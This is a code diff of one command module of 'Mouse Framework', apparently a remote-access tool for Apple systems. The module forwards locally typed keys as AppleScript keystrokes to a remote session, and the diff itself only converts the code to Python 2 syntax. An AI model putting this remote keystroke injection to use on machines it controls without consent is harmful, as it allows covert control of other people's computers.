@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 #            ---------------------------------------------------
-#                              Mouse Framework
+#                              Mouse Framework                                 
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -45,14 +45,15 @@ class command:
 
     def run(self,session,cmd_data):
         #do something with conn if you want
-        print("Type CTRL + C to quit...")
-        print("Start typing...")
+        print "Type CTRL + C to quit..."
+        print "Start typing..."
         while 1:
             key = getch()
-            if key == chr(0o3):
+            if key == chr(03):
                 return ""
             payload = """tell application "System Events"
             keystroke \""""+key+"""\"
             end tell"""
             session.send_command({"cmd":"applescript","args":payload})
         return ""
+
